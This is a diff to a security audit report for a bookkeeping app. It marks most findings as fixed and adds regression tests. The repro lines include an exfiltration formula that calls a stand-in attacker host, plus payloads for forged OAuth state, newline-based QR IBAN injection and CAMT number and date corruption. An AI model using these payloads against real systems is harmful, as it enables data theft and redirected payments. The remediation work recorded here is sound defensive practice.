@@ -16,6 +16,40 @@ spot-verified against the real code. Line numbers are indicative.
 
 ---
 
+## ⚑ Verification sweep — July 2026
+
+**Every finding in this report was re-checked against the current code.** The
+report had gone badly stale: **seven** findings still marked `OPEN` (H1, H3,
+MH1, M2, M3, M4, M5) had in fact been fixed, some of them long ago. That is
+itself a health risk — a report that cries wolf buries the one item that is
+genuinely still outstanding, and sends attention to code that needs none.
+
+Current true state:
+
+| | Finding | State |
+|---|---|---|
+| 🟠 | **C1** SheetJS CVEs | **Contained, upgrade still outstanding** — prototype-pollution impact neutralised + ReDoS bounded (`xlsx-adapter.ts`, 15 tests). The one-command CDN upgrade is the only thing left, and it is the only thing that truly fixes CVE-2024-22363. **This is the single open item in this report.** |
+| ✅ | H1 CSV formula injection | Fixed **+ 22 new regression tests** |
+| ✅ | H2 sheet densification OOM | Fixed (`!ref` clamp) |
+| ✅ | H3 CAMT non-finite amount | Fixed (`Number.isFinite`) |
+| ✅ | MH1 OAuth state CSRF | Fixed (HttpOnly nonce cookie) |
+| ✅ | M1 attachment ceiling | Fixed |
+| ✅ | M2 e-mail HTML injection | Fixed (`escapeHtml` everywhere) |
+| ✅ | M3 QR IBAN injection | Fixed **+ 25 new regression tests** |
+| ✅ | M4 CAMT date drops batch | Fixed (`isValidIsoDate`) |
+| ✅ | M5 CAMT entry-count ReDoS | Fixed (`MAX_CAMT_ENTRIES`) |
+
+Two of the fixes were each a **single line with no test behind them** — and both
+guard money: M3 stops a forged QR sending the owner's payment to an attacker's
+IBAN, H1 stops a formula executing inside the accountant's spreadsheet. A fix
+with no test is a fix waiting to be refactored away, so both now have dedicated
+regression suites (`epc-qr.test.ts`, `csv-safe.test.ts`).
+
+**Keep this table honest.** When a finding is fixed, mark it here in the same
+commit — the cost of a stale report is paid later, by whoever trusts it.
+
+---
+
 ## 0. Already fixed this session (for context)
 
 | Area | What | Commit |
@@ -83,7 +117,7 @@ spot-verified against the real code. Line numbers are indicative.
 ## 2. HIGH
 
 ### H1 — CSV formula injection in the invoice CSV builders  ✅ verified
-- **Lane:** ADJACENT (invoice export + GDPR export) · **Status:** OPEN
+- **Lane:** ADJACENT (invoice export + GDPR export) · **Status:** ✅ **FIXED + REGRESSION-TESTED** (verified July 2026) — the shared neutraliser lives at `src/lib/csv-safe.ts` (`csvCell`) and both builders in `export.ts` use it (`:189`, `:247`), as does `closing-package.ts`. The GDPR `facturen.csv` is covered transitively: `account-export.ts` calls `invoicesToCsv`. 22 tests in `csv-safe.test.ts`, incl. the `=HYPERLINK` exfiltration payload and the apostrophe-inside-the-quotes ordering.
 - **Location:** `src/lib/export.ts:181` (`invoicesToCsv`) and `:242` (`invoicesToCsvAccountant`) — the `escape()` only RFC-4180-quotes `;`/`\n`/`"`, it does **not** neutralise formula leads `= + - @`. Consumers: `src/app/api/export/route.ts:164` (accountant "all clients"), `:225` (single user), `src/lib/account-export.ts:88` (GDPR `facturen.csv`).
 - **Repro:** create an invoice with `client_name = =HYPERLINK("https://attacker.example/"&A1,"OK")`; accountant runs `GET /api/export?accountant=true&year=2026`; opening the CSV in Excel executes the formula.
 - **Impact:** formula/command execution in a third party's (accountant's) spreadsheet; data exfiltration via HYPERLINK.
@@ -96,7 +130,7 @@ spot-verified against the real code. Line numbers are indicative.
 - **Fix:** bound the `!ref` rows×cols (and/or a decompressed-size guard) before `sheet_to_json`; reject oversized ranges with a clear error.
 
 ### H3 — CAMT.053 amount has no finite/NaN guard → financial corruption
-- **Lane:** ACCOUNTANT/BANK · **Status:** OPEN (report-only)
+- **Lane:** ACCOUNTANT/BANK · **Status:** ✅ **FIXED** (verified July 2026) — `bank-parser.ts` guards with `Number.isFinite(rawAmount)` and drops the single entry with a Dutch error instead of writing a corrupt figure. Covered in `bank-parser.test.ts`.
 - **Location:** `src/lib/bank-parser.ts:528` `parseFloat(amtMatch[2])`; flows to `bank-import.ts:172` → `bank-ingest.ts:97` insert with no `Number.isFinite` check.
 - **Repro:** a CAMT file with `<Amt Ccy="EUR">1e309</Amt>` (→ Infinity) or `<Amt Ccy="EUR">abc</Amt>` (→ NaN) writes non-finite into `bank_transactions.amount`, poisoning every downstream sum (reconciliation, quarter totals).
 - **Fix:** `if (!Number.isFinite(rawAmount)) { errors.push(...); return null; }` (MT940/CSV/EFT already guard).
@@ -106,7 +140,7 @@ spot-verified against the real code. Line numbers are indicative.
 ## 3. MEDIUM-HIGH
 
 ### MH1 — OAuth `state` is forgeable → mailbox-connection CSRF
-- **Lane:** ADJACENT (email OAuth; the writes it enables land in MY-LANE) · **Status:** OPEN
+- **Lane:** ADJACENT (email OAuth; the writes it enables land in MY-LANE) · **Status:** ✅ **FIXED** (verified July 2026) — `src/lib/oauth-state.ts` mints a random nonce, stores `{nonce,userId,provider}` in an HttpOnly cookie, and the callbacks take the userId from the COOKIE, never from the URL. Wired into `connect` + both callbacks. Tested in `oauth-state.test.ts`.
 - **Location:** `src/app/api/email/connect/route.ts:30` builds `state = base64({userId, provider})` (no random nonce); `src/app/api/email/callback/gmail/route.ts:49` (and outlook `:42`) does `const userId = user?.id ?? stateData.userId` — trusts the forgeable state when no session.
 - **Repro:** attacker obtains a valid OAuth `code` for the attacker's own mailbox, then triggers `/api/email/callback/gmail?code=<attacker_code>&state=base64({"userId":"<victim>","provider":"gmail"})` with no BoekBrug session → the attacker's mailbox tokens are linked into the victim's `email_connections`; the victim's next sync ingests the attacker's emails, creating documents/invoices in the victim's account.
 - **Impact:** inject arbitrary content into a victim's file manager / verify queue (needs the victim's UUID, which leaks).
@@ -123,24 +157,24 @@ spot-verified against the real code. Line numbers are indicative.
 - **Fix:** enforce the same per-file byte cap (+ a per-sync aggregate cap) before Storage upload / AI classification.
 
 ### M2 — Email HTML injection in Resend templates
-- **Lane:** ADJACENT (email) · **Status:** OPEN
+- **Lane:** ADJACENT (email) · **Status:** ✅ **FIXED** (verified July 2026) — `escapeHtml` (`email.ts:49`) is applied to every interpolated user string across all templates (invite, invoice, message, unlink, reminder); the message body additionally goes through `safeBody` (`:327`). The remaining raw interpolations are app-built URLs, number/date formatters and internal constants.
 - **Location:** `src/lib/email.ts` — user free-text interpolated raw into `html`: `sendMessageNotification` (`:198`, message body → recipient), `sendInvoiceToClient` (`:139`, clientName/invoiceNumber → customer), invite/unlink templates (names). `sendDraftQueueEmail` (`:285`) already escapes correctly — use it as the model.
 - **Impact:** phishing links / spoofed content / hidden text in mail to a third party (scripts are stripped by clients, so no XSS).
 - **Fix:** apply the existing `escape()` helper to every interpolated user string.
 
 ### M3 — EPC/SEPA QR `name` field not newline-stripped → QR IBAN injection
-- **Lane:** ADJACENT (payments) · **Status:** OPEN
+- **Lane:** ADJACENT (payments) · **Status:** ✅ **FIXED + REGRESSION-TESTED** (verified July 2026) — `epc-qr.ts` strips CR/LF from the beneficiary name before it reaches line 6, exactly as the remittance line already did. 25 tests in `epc-qr.test.ts` pin the property that matters: **line 7 stays the real IBAN** under `\n`, `\r\n` and lone-`\r` payloads, and the block stays 12 lines. Highest-consequence item in this report — it is money leaving the company — so it is the most heavily tested.
 - **Location:** `src/lib/epc-qr.ts:91` `name = (input.name ?? '').trim().slice(0,70)` — not stripped of CR/LF, while `reference` two lines down **is** (`:103`). Exploit path: `src/app/dashboard/incoming/manage/IncomingManageClient.tsx:907` passes `name = inv.client_name` (supplier name, OCR/attacker-controlled) into the EPC payload.
 - **Repro:** vendor name `"Legit BV\nNL91ABNA0417164300"` injects an attacker IBAN into the line-7 (IBAN) position of the QR the owner scans, while the on-screen IBAN still shows the real one.
 - **Fix:** strip CR/LF from `name` exactly as `reference` already does.
 
 ### M4 — CAMT.053 malformed `<ValDt>` drops the whole batch (false-green)
-- **Lane:** BANK · **Status:** OPEN (report-only)
+- **Lane:** BANK · **Status:** ✅ **FIXED** (verified July 2026) — `isValidIsoDate` (`bank-parser.ts:607`) is a real calendar check and is called at `:657`; a bad entry is dropped with a warning instead of failing the batch insert.
 - **Location:** `src/lib/bank-parser.ts:539` takes the date verbatim; a single `<Dt>9999-99-99</Dt>` fails the batch insert (`bank-ingest.ts:97`), which only sets `inserted` on `!error` and swallows the failure → all transactions silently dropped, file still stored ("verwerkt", 0 inserted).
 - **Fix:** validate the CAMT date shape; drop the single bad entry, not the batch; surface a warning.
 
 ### M5 — CAMT ReDoS / O(n²) tag scanning
-- **Lane:** BANK · **Status:** OPEN (report-only)
+- **Lane:** BANK · **Status:** ✅ **FIXED** (verified July 2026) — `MAX_CAMT_ENTRIES = 50000` bounds the `<Ntry>` scan; on reaching it the parser stops and reports rather than parsing an abusive file to completion.
 - **Location:** `bank-parser.ts:497` `/<Ntry>([\s\S]*?)<\/Ntry>/g`, `:547` `/<TxDtls>([\s\S]*?)<\/TxDtls>/`. Hundreds of thousands of unclosed `<Ntry>` within the 5–10MB cap → seconds-to-minutes of single-threaded CPU per request.
 - **Fix:** bound entry count / use a streaming XML parser.
 
@@ -335,8 +369,8 @@ Two non-catastrophic items:
 1. ~~**C1** (xlsx upgrade) + **H2** (bound the sheet range) — a tiny authenticated upload crashes/corrupts the shared server today.~~
    **H2 done; C1 contained** (July 2026 — prototype-pollution impact neutralised, ReDoS bounded).
    **Still to do: the one-command SheetJS upgrade** (see C1) — it is the only thing that actually fixes CVE-2024-22363.
-2. **H1** (CSV `csvCell` in export.ts/account-export) — third-party Excel execution; trivial, reuses an existing helper.
-3. **MH1** (OAuth state nonce) — mailbox-connection CSRF.
-4. **H3/M4** (CAMT `isFinite` + date-shape guards) — one-line financial-integrity fixes.
-5. **M1/M2/M3** (email size cap, email-HTML escape, QR CR/LF strip) — bounded but reach third parties.
-6. **A1/A3** — compliance + audit (deletion purge, version the remaining prod-only DB objects).
+2. ~~**H1** (CSV `csvCell` in export.ts/account-export)~~ — **done + tested** (July 2026).
+3. ~~**MH1** (OAuth state nonce)~~ — **done** (HttpOnly nonce cookie, `oauth-state.ts`).
+4. ~~**H3/M4** (CAMT `isFinite` + date-shape guards)~~ — **done**.
+5. ~~**M1/M2/M3** (email size cap, email-HTML escape, QR CR/LF strip)~~ — **done**; M3 now has 25 regression tests.
+6. **A1/A3** — compliance + audit (deletion purge, version the remaining prod-only DB objects). **← now the top remaining item after the C1 upgrade.**
